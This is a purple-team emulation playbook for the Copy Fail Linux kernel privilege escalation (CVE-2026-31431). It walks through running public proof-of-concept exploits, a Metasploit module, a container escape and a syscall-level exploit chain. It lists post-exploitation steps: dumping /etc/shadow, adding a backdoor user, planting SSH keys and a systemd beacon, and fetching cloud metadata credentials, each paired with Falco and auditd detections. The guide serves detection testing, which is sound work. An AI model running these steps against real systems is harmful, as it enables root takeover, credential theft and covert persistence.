# Copy Fail (CVE-2026-31431) — Adversary Emulation Guide

> **Purpose:** Purple team / adversary emulation playbook for validating detection coverage and mitigation effectiveness against the Copy Fail Linux kernel LPE.
> **Scope:** Lab environment emulation only. Do not run against production systems you do not own.
> **ATT&CK Coverage:** T1068 · T1548.001 · T1055 · T1574 · T1611 · T1059.006 · T1106
> **Last updated:** 2026-05-07 | Author: C3PO | TLP: WHITE

---

## Table of Contents

1. [Prerequisites & Lab Setup](#1-prerequisites--lab-setup)
2. [Phase 1 — Initial Foothold Simulation](#2-phase-1--initial-foothold-simulation)
3. [Phase 2 — Reconnaissance (Pre-Exploit)](#3-phase-2--reconnaissance-pre-exploit)
4. [Phase 3 — Core LPE Exploit (T1068 · T1548.001 · T1055 · T1574)](#4-phase-3--core-lpe-exploit)
5. [Phase 4 — Container Escape Variant (T1611)](#5-phase-4--container-escape-variant)
6. [Phase 5 — Post-Exploitation Actions](#6-phase-5--post-exploitation-actions)
7. [Detection Validation Checkpoints](#7-detection-validation-checkpoints)
8. [Cleanup](#8-cleanup)
9. [Expected Artifacts Summary](#9-expected-artifacts-summary)

---

## 1. Prerequisites & Lab Setup

### 1.1 Vulnerable Target Requirements

Copy Fail requires a kernel in the range **4.14 – 7.0-rc** (any kernel shipped between July 2017 and April 2026). Do **not** use a patched kernel — the exploit simply won't work.

**Recommended lab target OS images:**

| Distribution | Version | Kernel | Notes |
|---|---|---|---|
| Ubuntu | 24.04 LTS (unpatched) | 6.8.x | Best documented; Theori primary target |
| Ubuntu | 22.04 LTS (unpatched) | 5.15.x | Wide enterprise deployment |
| Amazon Linux | 2023 (pre-patch AMI) | 6.1.x | Cloud scenario |
| RHEL / Rocky | 9 (pre-patch) | 5.14.x | Enterprise scenario |
| Debian | 12 Bookworm (pre-patch) | 6.1.x | Server scenario |

**Quickest approach:** Spin a Ubuntu 24.04 VM/container and **hold back kernel updates** before patching reached your distro, or use a snapshot from before May 1, 2026.

> **Verification — confirm the target is vulnerable:**
> ```bash
> uname -r
> # Must be 4.14–7.0-rc range
>
> lsmod | grep algif_aead
> # Should return something, OR:
> grep algif_aead /lib/modules/$(uname -r)/modules.builtin
> # If built-in, it's available without loading
>
> modinfo algif_aead 2>/dev/null && echo "MODULE AVAILABLE" || echo "MODULE NOT FOUND"
> ```

### 1.2 Attacker Machine Requirements

- Python 3.6+ (standard library only — no pip deps)
- `git` for cloning PoCs
- Metasploit Framework (optional — for Metasploit path)
- SSH or shell access to the target as an **unprivileged user** (no sudo)

### 1.3 Detection Stack Setup (Blue Team)

Before running the emulation, stand up your detection stack on or alongside the target:

```bash
# Install Falco (recommended — Sysdig TRT rule is purpose-built for this exploit)
curl -s https://falco.org/repo/falcosecurity-packages.asc | apt-key add -
echo "deb https://download.falco.org/packages/deb stable main" > /etc/apt/sources.list.d/falcosecurity.list
apt update && apt install -y falco

# Enable auditd with AF_ALG socket audit rule
apt install -y auditd
auditctl -a always,exit -F arch=b64 -S socket -F a0=38 -k af_alg_audit

# Optionally: configure syslog forwarding to your SIEM before running
```

Deploy the Sysdig TRT Falco rule from the COPYFAIL profile before proceeding to Phase 3.

---

## 2. Phase 1 — Initial Foothold Simulation

*ATT&CK: T1078.003 (Local Accounts) / T1133 (External Remote Services)*

Copy Fail is a **local** exploit — it requires an existing unprivileged shell. Simulate the initial foothold to make the emulation chain realistic:

### Option A — SSH as low-privilege user (most realistic)

```bash
# On attacker machine — SSH as an unprivileged user (no sudo rights)
ssh lowprivuser@<target-ip>

# Confirm you are NOT root
id
# uid=1001(lowprivuser) gid=1001(lowprivuser) groups=1001(lowprivuser)

whoami
# lowprivuser
```

### Option B — Simulate web app RCE into a shell

```bash
# Simulate dropping a reverse shell as www-data (web server user)
# On target:
su -s /bin/bash www-data
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Option C — Container foothold (for container escape scenario → see Phase 4)

```bash
docker run -it --rm ubuntu:24.04 /bin/bash
# You are now inside an unprivileged container as root within namespace (not host root)
id
# uid=0(root) gid=0(root) groups=0(root)
# Note: UID 0 inside a standard container ≠ host root without kernel exploit
```

---

## 3. Phase 2 — Reconnaissance (Pre-Exploit)

*ATT&CK: T1082 (System Information Discovery) · T1083 (File and Directory Discovery)*

Before running the exploit, simulate the attacker's pre-exploitation recon. These commands are what a real attacker would run to confirm viability.

```bash
# 1. Kernel version — confirm vulnerable range
uname -r
cat /proc/version

# 2. Confirm algif_aead is available (required for exploit)
lsmod | grep algif_aead          # Loaded as module
grep algif_aead /proc/modules    # Alternative check
grep algif_aead /lib/modules/$(uname -r)/modules.builtin  # Built-in check

# If not loaded, attempt to load it (usually auto-loads on first AF_ALG socket)
python3 -c "import socket; s = socket.socket(41, 5, 0); print('AF_ALG socket created')"
# socket(AF_ALG=41, SOCK_SEQPACKET=5) — this auto-loads algif_aead if available

# 3. Identify available setuid binaries (exploit targets)
find / -perm -4000 -type f 2>/dev/null
# Look for: /usr/bin/su, /usr/bin/passwd, /usr/bin/newgrp, /usr/bin/chsh

# 4. Confirm target binary is readable (required)
ls -la /usr/bin/su
# -rwsr-xr-x 1 root root ... /usr/bin/su
# 's' in owner permissions = setuid bit set ✅

# 5. Check for active defenses
cat /proc/sys/kernel/yama/ptrace_scope   # 0=permissive, 1+ = restricted
sestatus 2>/dev/null || echo "SELinux not running"
aa-status 2>/dev/null || echo "AppArmor not running"
```

> **Blue Team checkpoint:** None of these recon commands are inherently malicious or detectable by most tools. Standard `find -perm -4000` is common admin activity. The `socket(AF_ALG)` call is the first detectable event if Falco is running.

---

## 4. Phase 3 — Core LPE Exploit

*ATT&CK: T1068 · T1548.001 · T1055 · T1574 · T1059.006 · T1106*

### 4.1 Option A — Theori PoC (Primary / Recommended)

```bash
# On the target, as unprivileged user:

# Clone the PoC
git clone https://github.com/theori-io/copy-fail-CVE-2026-31431
cd copy-fail-CVE-2026-31431

# Inspect the script before running (good practice; also important for understanding)
cat exploit.py

# Run the exploit
python3 exploit.py

# Expected output:
# [*] Locating target setuid binary: /usr/bin/su
# [*] Opening AF_ALG AEAD socket (authencesn(hmac(sha256),cbc(aes)))
# [*] Splicing /usr/bin/su page cache into crypto pipeline
# [*] Triggering scratch write via recvmsg() — iteration 1/N
# [*] Staging shellcode at offset 0x...
# [*] Page cache poisoning complete
# [*] Executing /usr/bin/su...
# [+] UID: 0 — root shell obtained

id
# uid=0(root) gid=0(root) groups=0(root)
```

### 4.2 Option B — rootsecdev PoC (Second Public PoC)

```bash
git clone https://github.com/rootsecdev/cve_2026_31431
cd cve_2026_31431
python3 poc.py --target /usr/bin/passwd   # alternate setuid binary
```

### 4.3 Option C — Metasploit Module

```bash
# On attacker machine with msfconsole:
msfconsole -q

use exploits/linux/local/cve_2026_31431_copy_fail
info

# Required options:
set SESSION <existing_session_id>   # Must have a Meterpreter/shell session on target first
set LHOST <attacker-ip>
set LPORT 4444

# Optional tuning:
set TARGET_BINARY /usr/bin/su       # Default; can change to passwd, newgrp, etc.
set WritableDir /tmp                # Where exploit staging files land

run

# Expected: session upgrades to UID 0
```

> **Metasploit note:** The module requires a pre-existing session (matching Option A/B above as the foothold). Use `sessions -l` to list available sessions and pass the ID to SESSION.

### 4.4 Understanding the Syscall Chain (Annotated)

The exploit performs exactly 5 logical steps. Understanding these is critical for detection tuning:

```
STEP 1 — Bind AF_ALG socket (algif_aead)
────────────────────────────────────────
socket(AF_ALG=41, SOCK_SEQPACKET=5, 0)       ← DETECTION POINT 1
setsockopt(fd, SOL_ALG, ALG_SET_KEY, key, keylen)
bind(fd, {sa_family=AF_ALG,
          alg_type="aead",
          alg_name="authencesn(hmac(sha256),cbc(aes))"}, ...)

STEP 2 — Get accept socket
────────────────────────────────────────
accept(fd, NULL, NULL)  → op_fd

STEP 3 — Splice /usr/bin/su's page cache into the pipeline
────────────────────────────────────────
open("/usr/bin/su", O_RDONLY)                 ← DETECTION POINT 2
pipe2(pipefd, 0)
splice(su_fd, NULL, pipefd[1], NULL, 4096, 0) ← DETECTION POINT 3
splice(pipefd[0], NULL, op_fd, NULL, 4096, 0)

STEP 4 — Trigger scratch write (page cache corruption)
────────────────────────────────────────
sendmsg(op_fd, {aad=<4 controlled bytes at target offset>}, 0)
recvmsg(op_fd, ...)
# HMAC fails (expected) — but the 4-byte write into su's page cache already landed

STEP 5 — Repeat steps 3–4 at successive offsets to stage shellcode
────────────────────────────────────────
# Loop ~N times targeting different offsets
# Then:
execve("/usr/bin/su", ["/usr/bin/su", "-p"], envp)  ← DETECTION POINT 4
# Kernel serves attacker's poisoned su from page cache → root shell
```

> **Key insight for detections:** DETECTION POINT 1 (AF_ALG SEQPACKET socket from non-crypto process) is the highest-fidelity alert. It fires before any page cache modification occurs. If your Falco rule fires here, you can interrupt the chain before exploitation completes.

### 4.5 Exploit Against Alternative Setuid Binaries

`/usr/bin/su` is the default but not the only target. Test against others to validate that detections fire regardless of the targeted binary:

```bash
python3 exploit.py --binary /usr/bin/passwd
python3 exploit.py --binary /usr/bin/newgrp
python3 exploit.py --binary /usr/bin/chsh
```

> **Why this matters:** Some detection rules are hard-coded to alert on `splice()` from a process to `/usr/bin/su` specifically. Testing alternatives confirms whether coverage is binary-agnostic (it should be — the detection should key on AF_ALG SEQPACKET + any setuid binary, not `su` specifically).

---

## 5. Phase 4 — Container Escape Variant

*ATT&CK: T1611 (Escape to Host)*

This phase emulates the Kubernetes/container attack path. Requires a standard (non-rootless) container running on a vulnerable host kernel.

### 5.1 Setup

```bash
# On the host — spin a standard Docker container
docker run -it --rm \
  --name copyfail-test \
  ubuntu:24.04 \
  /bin/bash

# Inside the container:
id
# uid=0(root) gid=0(root) — root inside container, NOT host root
```

### 5.2 Confirm Shared Page Cache (Exploit Viability Check)

```bash
# Inside container — verify the host's /usr/bin/su is reachable via bind mount or path
# In a standard Docker container, host binaries are NOT mounted by default
# Use the Kubernetes PoC which handles the mount path

# Alternatively: bind-mount for testing
# On host:
docker run -it --rm \
  --name copyfail-test \
  -v /usr/bin:/host/usr/bin:ro \
  ubuntu:24.04 \
  /bin/bash

# Inside container — now /host/usr/bin/su is the host's setuid binary
ls -la /host/usr/bin/su
```

### 5.3 Run Container Escape PoC

```bash
# Inside container:
git clone https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC
cd Copy-Fail-CVE-2026-31431-Kubernetes-PoC

python3 escape.py --host-binary /host/usr/bin/su

# Expected output:
# [*] Running inside container — targeting host page cache
# [*] Host binary at /host/usr/bin/su mapped via bind mount
# [*] Executing Copy Fail against host kernel page cache...
# [+] Host root shell obtained — escaped container boundary

# Verify:
cat /proc/1/cgroup    # Should show host's cgroup, not container's
ls /                   # Host filesystem
```

### 5.4 Rootless Container — Negative Control

```bash
# Confirm rootless containers are NOT vulnerable to host escape
# On host as non-root user with rootless Docker/Podman:
podman run --userns=keep-id -it --rm \
  -v /usr/bin:/host/usr/bin:ro \
  ubuntu:24.04 \
  /bin/bash

# Run the same exploit — should NOT yield host root
python3 escape.py --host-binary /host/usr/bin/su

# Expected: escalation scoped within User Namespace only; host root NOT obtained
# This is your negative control — confirms rootless containers are safe
```

---

## 6. Phase 5 — Post-Exploitation Actions

*Simulate what a real attacker would do after obtaining root. Run these to validate post-exploitation detections.*

### 6.1 Persistence (T1543.002 — Systemd Service)

```bash
# From root shell:
cat > /etc/systemd/system/c3po-beacon.service << 'EOF'
[Unit]
Description=System Monitoring Service

[Service]
ExecStart=/bin/bash -c 'while true; do echo beacon; sleep 60; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable c3po-beacon
systemctl start c3po-beacon

# Clean up immediately after detection validation:
systemctl disable c3po-beacon && systemctl stop c3po-beacon
rm /etc/systemd/system/c3po-beacon.service
```

### 6.2 Credential Access (T1003.008 — /etc/passwd and Shadow)

```bash
# Dump shadow file (confirms root access — detection: unexpected shadow read)
cat /etc/shadow

# Add backdoor user (detection: useradd from unexpected process)
useradd -m -s /bin/bash -G sudo emultest
echo "emultest:Password123!" | chpasswd

# Clean up:
userdel -r emultest
```

### 6.3 Persistence via SSH Key (T1098 — Account Manipulation)

```bash
# Add attacker SSH key to root (detection: root authorized_keys modification)
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E... emulation-test-key" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Clean up:
sed -i '/emulation-test-key/d' /root/.ssh/authorized_keys
```

### 6.4 Discovery from Root Context (T1082 · T1016 · T1049)

```bash
# Network discovery (detection: unexpected network enum from low-privilege context)
ip a
ip route
ss -tulpn
arp -n

# Credential file access
cat /etc/shadow
find / -name "*.key" -o -name "id_rsa" 2>/dev/null | head -20
find / -name ".env" 2>/dev/null | head -10

# Cloud metadata (if cloud instance — detection: IMDS access)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null
```

---

## 7. Detection Validation Checkpoints

Use these to score your detection coverage after each phase.

### 7.1 Falco Alerts Expected

| Phase | Event | Expected Falco Alert | Priority |
|---|---|---|---|
| Phase 3, Step 1 | `socket(AF_ALG, SOCK_SEQPACKET)` from non-crypto process | `Unexpected Process Using Kernel AEAD Crypto Socket` | CRITICAL |
| Phase 3, Step 3 | `splice()` from AF_ALG socket to setuid binary fd | Custom rule (if deployed) | CRITICAL |
| Phase 3, Step 5 | `execve(/usr/bin/su)` immediately after AF_ALG socket activity | Behavioral correlation | HIGH |
| Phase 5.1 | New systemd service unit written to `/etc/systemd/system/` | Built-in Falco rule | HIGH |
| Phase 5.3 | Write to `/root/.ssh/authorized_keys` | Built-in Falco rule | HIGH |

### 7.2 Auditd Events Expected

```bash
# Check auditd log for AF_ALG socket creation (key: af_alg_audit)
ausearch -k af_alg_audit --format text

# Expected entry:
# type=SYSCALL ... syscall=socket a0=29 a1=5 a2=0 ...
# a0=0x29 = 41 = AF_ALG; a1=0x5 = 5 = SOCK_SEQPACKET

# Check for splice() calls (syscall 275)
ausearch -sc splice --format text

# Check for unexpected UID 0 transitions
ausearch --format text | grep "uid=0" | grep -v "auid=0"
```

### 7.3 Microsoft Defender Signatures (if applicable)

If running Defender on Linux, confirm these signatures fire:

| Signature | Trigger |
|---|---|
| `Exploit:Python/CopyFail.A` | Theori PoC script executed |
| `Exploit:Linux/CopyFailExpDl.A` | Compiled binary variant |
| `Behavior:Linux/CVE-2026-31431` | Behavioral detection (syscall pattern) |

### 7.4 FIM — Expected Non-Alert (Evasion Validation)

```bash
# Confirm file integrity monitoring does NOT alert on the on-disk binary
# Run your FIM check AFTER the exploit poisons the page cache but BEFORE rebooting

# AIDE example:
aide --check /usr/bin/su
# Should report: NO CHANGES (the disk binary is untouched)

# sha256sum check:
sha256sum /usr/bin/su
# Should match pre-exploit hash

# This CONFIRMS the evasion works (T1211 / T1574)
# Your FIM is blind to Copy Fail — disk-based integrity checks are insufficient
```

### 7.5 Scoring Matrix

| Detection | Coverage | Notes |
|---|---|---|
| Falco AF_ALG SEQPACKET rule | ✅ HIGH | Fires before exploitation completes |
| Auditd AF_ALG socket rule | ✅ HIGH | Fires at Step 1 |
| Behavioral UID 0 transition correlation | ✅ MEDIUM | Fires post-exploit; confirms escalation occurred |
| Disk-based FIM (AIDE/Tripwire) | ❌ BLIND | Cannot detect page cache corruption — expected |
| AV static scan of PoC script | ✅ MEDIUM | Catches known PoC; misses modified variants |
| seccomp blocking AF_ALG (domain=38) | ✅ PREVENTS | Exploit cannot start if enforced on container |

---

## 8. Cleanup

**Always run cleanup before ending the emulation session.**

```bash
# 1. Drop the root shell (return to unprivileged context)
exit

# 2. Remove PoC files
rm -rf ~/copy-fail-CVE-2026-31431
rm -rf ~/cve_2026_31431
rm -rf ~/Copy-Fail-CVE-2026-31431-Kubernetes-PoC

# 3. Reboot the target (clears all page cache modifications — most important step)
# Page cache corruption is entirely in-memory; reboot returns the system to clean state
sudo reboot
# OR on cloud instance: stop and start (not just restart — forces new memory state)

# 4. Verify the target is clean post-reboot
sha256sum /usr/bin/su   # Should match known-good hash
id                       # Should be non-root

# 5. Remove any post-exploitation artifacts (if Phase 5 was run)
# - systemd service: already cleaned in Phase 5.1
# - shadow modifications: already cleaned in Phase 5.2
# - SSH keys: already cleaned in Phase 5.3

# 6. Remove auditd rules
auditctl -D   # Deletes all rules (or remove just the af_alg rule by key)
auditctl -d always,exit -F arch=b64 -S socket -F a0=38 -k af_alg_audit

# 7. Archive your detection logs before cleanup
cp /var/log/falco/events.log ~/copyfail-emulation-falco-$(date +%Y%m%d).log
cp /var/log/audit/audit.log  ~/copyfail-emulation-audit-$(date +%Y%m%d).log
```

---

## 9. Expected Artifacts Summary

| Artifact | Type | Location | Persists After Reboot? |
|---|---|---|---|
| AF_ALG SEQPACKET socket | Memory | `/proc/<pid>/fd/` | ❌ No |
| Page cache modification | Memory (kernel) | Kernel page cache | ❌ No — reboot clears |
| PoC Python script | Disk | `~/copy-fail-CVE-2026-31431/` | ✅ Yes — delete manually |
| Falco alert | Log | `/var/log/falco/events.log` | ✅ Yes |
| Auditd syscall record | Log | `/var/log/audit/audit.log` | ✅ Yes |
| Metasploit staging files | Disk | `/tmp/` (WritableDir) | ✅ Yes — delete manually |
| Root shell process | Memory | N/A | ❌ No |

> **Critical cleanup note:** Copy Fail leaves **zero on-disk artifacts from the exploit primitive itself**. The PoC script is the only file you need to manually delete. The page cache corruption is gone after reboot. This is why runtime detection (Falco/auditd) is the only reliable detection path — there is nothing to find forensically post-reboot.

---

## References

- [Theori / Xint — Copy Fail technical disclosure (Apr 29, 2026)](https://xint.io/blog/copy-fail-linux-distributions)
- [Theori PoC — theori-io/copy-fail-CVE-2026-31431](https://github.com/theori-io/copy-fail-CVE-2026-31431)
- [rootsecdev second PoC — rootsecdev/cve_2026_31431](https://github.com/rootsecdev/cve_2026_31431)
- [Percivalll Kubernetes PoC](https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC)
- [Sysdig TRT — Falco detection rule + analysis (Apr 30, 2026)](https://www.sysdig.com/blog/cve-2026-31431-copy-fail-linux-kernel-flaw-lets-local-users-gain-root-in-seconds)
- [Microsoft Defender analysis + detection guidance (May 1, 2026)](https://www.microsoft.com/en-us/security/blog/2026/05/01/cve-2026-31431-copy-fail-vulnerability-enables-linux-root-privilege-escalation/)
- [CISA KEV — CVE-2026-31431](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [Metasploit module — exploits/linux/local/cve_2026_31431_copy_fail](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/cve_2026_31431_copy_fail.rb)
- [COPYFAIL profile.md](./profile.md)
- [COPYFAIL mitre-attack-map.md](./mitre-attack-map.md)

---

*Created: 2026-05-07 | Author: C3PO | CVE: CVE-2026-31431 | TLP: WHITE*
